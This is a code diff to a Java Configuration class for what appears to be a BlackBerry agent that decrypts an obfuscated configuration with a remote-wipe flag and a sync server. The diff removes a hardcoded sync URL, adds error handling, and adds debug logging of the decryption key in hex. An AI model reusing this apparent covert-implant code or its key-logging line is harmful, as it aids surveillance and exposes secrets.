@@ -26,6 +26,7 @@ import blackberry.manager.ActionManager;
 import blackberry.manager.EventManager;
 import blackberry.manager.ModuleManager;
 import blackberry.module.BaseModule;
+import blackberry.utils.Utils;
 
 public class Configuration {
     //#ifdef DEBUG
@@ -46,8 +47,6 @@ public class Configuration {
     /** The Constant TASK_ACTION_TIMEOUT. */
     public static final long TASK_ACTION_TIMEOUT = 600000;
 
-    public static final boolean OVERRIDE_SYNC_URL = false;
-    public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
     /** The Constant MIN_AVAILABLE_SIZE. */
     public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
@@ -303,14 +302,23 @@ public class Configuration {
 
         Globals g = new Globals();
 
-        JSONObject jquota = jglobals.getJSONObject(Messages.getString("q.5")); //$NON-NLS-1$
-        g.quotaMin = jquota.getInt(Messages.getString("q.6")); //$NON-NLS-1$
-        g.quotaMax = jquota.getInt(Messages.getString("q.7")); //$NON-NLS-1$
+        try {
+            JSONObject jquota = jglobals.getJSONObject(Messages
+                    .getString("q.5")); //$NON-NLS-1$
+            g.quotaMin = jquota.getInt(Messages.getString("q.6")); //$NON-NLS-1$
+            g.quotaMax = jquota.getInt(Messages.getString("q.7")); //$NON-NLS-1$
 
-        g.wipe = jglobals.getBoolean(Messages.getString("q.8")); //$NON-NLS-1$
-        g.type = jglobals.getString(Messages.getString("q.9")); //$NON-NLS-1$
-        g.migrated = jglobals.getBoolean(Messages.getString("q.10")); //$NON-NLS-1$
-        g.version = jglobals.getInt(Messages.getString("q.11")); //$NON-NLS-1$
+            g.wipe = jglobals.getBoolean(Messages.getString("q.8")); //$NON-NLS-1$
+            g.type = jglobals.getString(Messages.getString("q.9")); //$NON-NLS-1$
+            //g.migrated = jglobals.getBoolean(Messages.getString("q.10")); //$NON-NLS-1$
+            //g.version = jglobals.getInt(Messages.getString("q.11")); //$NON-NLS-1$
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            debug.error("loadGlobals: " + jglobals);
+            //#endif
+
+        }
 
         status.setGlobal(g);
     }
@@ -339,6 +347,11 @@ public class Configuration {
         try {
             EncryptionPKCS5 crypto = new EncryptionPKCS5(Keys.getInstance()
                     .getConfKey());
+
+            //#ifdef DEBUG
+            debug.trace("decryptConfiguration, confKey: "
+                    + Utils.byteArrayToHex(Keys.getInstance().getConfKey()));
+            //#endif
             final byte[] clearConf = crypto.decryptDataIntegrity(rawConf, len,
                     offset);
 
@@ -351,6 +364,10 @@ public class Configuration {
                 //#endif
 
                 return json;
+            } else {
+                //#ifdef DEBUG
+                debug.warn("decryptConfiguration, empty json: " + json);
+                //#endif
             }
             return null;
 
@@ -371,6 +388,10 @@ public class Configuration {
 
     public boolean isDecrypted() {
         return jsonResource != null;
+    }
+
+    public String getJson() {
+        return jsonResource;
     }
 
 }
